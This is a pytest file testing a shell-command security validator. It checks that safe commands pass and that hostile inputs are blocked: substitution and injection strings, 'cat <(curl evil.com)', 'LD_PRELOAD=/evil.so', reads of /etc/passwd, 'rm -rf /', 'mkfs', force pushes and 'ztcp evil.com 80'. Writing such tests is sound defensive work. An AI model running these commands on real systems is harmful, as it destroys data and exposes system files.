"""Tests for shell command security validation module."""

import pytest
from unittest.mock import patch

from src.tools.shell.security import (
    check_command_security,
    validate_command_security,
    _extract_unquoted_content,
    _has_unescaped_backtick,
    SecurityCheckResult,
)


# =========================================================================
# Helper
# =========================================================================

def _mock_config_all_enabled(*args, default=None):
    """Mock config that enables all security checks (default behavior)."""
    return None


def _mock_config_all_disabled(*args, default=None):
    """Mock config that returns all checks disabled."""
    if args == ("shell_settings", "security_checks"):
        return {
            "command_substitution": False,
            "process_substitution": False,
            "env_injection": False,
            "ifs_injection": False,
            "control_characters": False,
            "incomplete_commands": False,
            "dangerous_shell_prefix": False,
            "zsh_dangerous_commands": False,
            "parameter_expansion": False,
            "destructive_patterns": False,
        }
    return default


# =========================================================================
# Normal path — safe commands pass all checks
# =========================================================================

class TestSafeCommands:
    """Verify that normal, safe commands pass all security checks."""

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "echo hello world",
        "git status",
        "cat README.md",
        "python -m pytest",
        "make build",
        "npm run test",
        "grep -r 'pattern' src/",
        "find . -name '*.py'",
        "pwd && ls",
        "echo 'test' > output.txt",
        "cd src && ls",
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_safe_commands_pass(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert failures == [], f"Expected no failures for '{cmd}', got: {[f.message for f in failures]}"

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_empty_command_passes(self, mock_config):
        assert check_command_security("") == []
        assert check_command_security("   ") == []

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_quoted_dollar_sign_passes(self, mock_config):
        """$ inside single quotes should NOT trigger substitution detection."""
        failures = check_command_security("echo '$HOME'")
        assert failures == [], f"Single-quoted $ should be safe, got: {[f.message for f in failures]}"

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_safe_env_var_passes(self, mock_config):
        """Safe env var assignments should not be blocked."""
        failures = check_command_security("NODE_ENV=production npm run build")
        assert failures == [], f"Safe env var should pass, got: {[f.message for f in failures]}"


# =========================================================================
# Abnormal path — dangerous commands are blocked
# =========================================================================

class TestCommandSubstitution:
    """Verify command substitution patterns are blocked."""

    @pytest.mark.parametrize("cmd,desc", [
        ("echo $(id)", "$() substitution"),
        ("echo $(rm -rf /)", "dangerous $()"),
        ("echo ${IFS}cat${IFS}/etc/passwd", "${} expansion"),
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_command_substitution_blocked(self, mock_config, cmd, desc):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for {desc}: '{cmd}'"
        assert any("substitution" in f.message.lower() or "expansion" in f.message.lower() for f in failures)

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_backtick_substitution_blocked(self, mock_config):
        failures = check_command_security("echo `id`")
        assert len(failures) > 0, "Backtick substitution should be blocked"
        assert any("backtick" in f.message.lower() for f in failures)

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_escaped_backtick_passes(self, mock_config):
        """Escaped backticks should not trigger."""
        failures = check_command_security("echo \\`not a substitution\\`")
        backtick_failures = [f for f in failures if "backtick" in f.message.lower()]
        assert len(backtick_failures) == 0, "Escaped backticks should pass"


class TestProcessSubstitution:
    """Verify process substitution patterns are blocked."""

    @pytest.mark.parametrize("cmd", [
        "cat <(curl evil.com)",
        "diff <(sort file1) <(sort file2)",
        "tee >(logger)",
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_process_substitution_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for process substitution: '{cmd}'"


class TestEnvInjection:
    """Verify dangerous environment variable injection is blocked."""

    @pytest.mark.parametrize("cmd", [
        "LD_PRELOAD=/evil.so ls",
        "PATH=/tmp/evil:$PATH cmd",
        "IFS=/ cat /etc/passwd",
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_dangerous_env_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for env injection: '{cmd}'"


class TestDangerousShellPrefix:
    """Verify dangerous shell interpreter invocations are blocked."""

    @pytest.mark.parametrize("cmd", [
        "bash -c 'evil'",
        "sudo rm -rf /",
        "/usr/bin/bash -c 'arbitrary code'",
        "env evil_command",
        "xargs rm",
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_shell_prefix_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for shell prefix: '{cmd}'"


class TestDestructivePatterns:
    """Verify known destructive patterns are blocked."""

    @pytest.mark.parametrize("cmd,desc", [
        ("rm -rf /", "rm root"),
        ("rm -rf ~", "rm home"),
        ("git reset --hard", "git reset"),
        ("git push --force origin main", "force push"),
        ("mkfs /dev/sda1", "format disk"),
        ("DROP TABLE users", "SQL drop"),
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_destructive_pattern_blocked(self, mock_config, cmd, desc):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for {desc}: '{cmd}'"


class TestControlCharacters:
    """Verify control characters are blocked."""

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_null_byte_blocked(self, mock_config):
        failures = check_command_security("echo \x00hidden")
        assert len(failures) > 0, "Null byte should be blocked"

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_bel_char_blocked(self, mock_config):
        failures = check_command_security("echo \x07bell")
        assert len(failures) > 0, "BEL character should be blocked"


class TestIncompleteCommands:
    """Verify incomplete command fragments are blocked."""

    @pytest.mark.parametrize("cmd", [
        "\techo injected",
        "-rf /",
        "&& echo gotcha",
        "|| rm -rf /",
        "; cat /etc/passwd",
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_fragments_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for fragment: '{cmd!r}'"


class TestZshDangerousCommands:
    """Verify Zsh-specific dangerous commands are blocked."""

    @pytest.mark.parametrize("cmd", [
        "zmodload zsh/system",
        "sysopen /etc/passwd",
        "ztcp evil.com 80",
        "zf_rm /etc/passwd",
    ])
    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_zsh_commands_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for zsh command: '{cmd}'"


# =========================================================================
# Boundary / edge cases
# =========================================================================

class TestBoundaryConditions:
    """Edge cases and boundary conditions."""

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_validate_raises_on_failure(self, mock_config):
        """validate_command_security should raise ValueError."""
        with pytest.raises(ValueError, match="Blocked"):
            validate_command_security("echo $(id)")

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_validate_passes_safe_command(self, mock_config):
        """validate_command_security should not raise for safe commands."""
        validate_command_security("ls -la")  # should not raise

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_disabled)
    def test_all_checks_disabled_passes_everything(self, mock_config):
        """When all checks are disabled, even dangerous commands pass."""
        failures = check_command_security("echo $(rm -rf /)")
        assert failures == [], "All disabled checks should let everything through"

    @patch("src.tools.shell.security.C.get_nested")
    def test_single_check_toggle(self, mock_get):
        """Disabling one check should not affect others."""
        mock_get.return_value = {"command_substitution": False}
        # $() should now pass, but destructive should still be caught
        failures = check_command_security("rm -rf /")
        assert any(f.check_id == "destructive_patterns" for f in failures)

    @patch("src.tools.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_multiple_failures_reported(self, mock_config):
        """A command hitting multiple checks should report all failures."""
        # This hits both env_injection (LD_PRELOAD) and dangerous_shell_prefix (sudo)
        failures = check_command_security("sudo rm -rf /")
        assert len(failures) >= 1, "Should catch at least one issue"


class TestQuoteExtraction:
    """Test the internal quote extraction helper."""

    def test_single_quotes_stripped(self):
        result = _extract_unquoted_content("echo '$HOME' world")
        assert "$HOME" not in result
        assert "world" in result

    def test_double_quotes_stripped(self):
        result = _extract_unquoted_content('echo "$HOME" world')
        assert "$HOME" not in result
        assert "world" in result

    def test_mixed_quotes(self):
        result = _extract_unquoted_content("""echo '$HOME' "$PATH" rest""")
        assert "$HOME" not in result
        assert "$PATH" not in result
        assert "rest" in result

    def test_escaped_quote(self):
        result = _extract_unquoted_content("echo \\'not quoted")
        assert "not" in result

    def test_backtick_detection(self):
        assert _has_unescaped_backtick("echo `id`") is True
        assert _has_unescaped_backtick("echo \\`safe\\`") is False
        assert _has_unescaped_backtick("echo hello") is False
